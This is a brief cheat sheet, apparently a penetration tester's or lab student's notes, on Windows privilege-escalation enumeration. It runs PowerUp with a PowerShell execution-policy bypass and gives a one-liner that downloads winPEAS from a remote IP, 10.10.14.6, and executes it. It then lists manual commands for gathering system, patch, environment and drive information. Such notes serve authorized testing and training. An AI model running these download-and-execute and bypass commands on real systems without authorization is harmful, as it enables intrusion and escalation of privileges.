# Automatic tools
## From file
```
c:> powershell.exe -nop -exec bypass
PS C:> ./PowerUp.ps1
PS C:> Invoke-AllChecks
```
# From url
```
c:> powershell.exe -nop -exec bypass
PS c:> Import-MOdule ./PowerUp.ps1
PS c:> Invoke-AllChecks
```
# 2. Winpeas
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "IEX(New-Object System.Net.WebClient).downloadFile('http://10.10.14.6/winPEAS64.exe','C:\users\Administrator\Documents\wp.exe')"

c:\users\kosts\Desktop> .\wp.exe
```
# Manual info gathering
## Operating System
```
system info
wmic qfe
```
# Environment variables
```
set
Get-ChildItem Env: | ft Key,Value
```
# Drives
```
net use
wmic logicaldisk get caption, description, providername
wmic logicaldisk get name
wmic logicaldisk get caption
diskpart
list volume
```
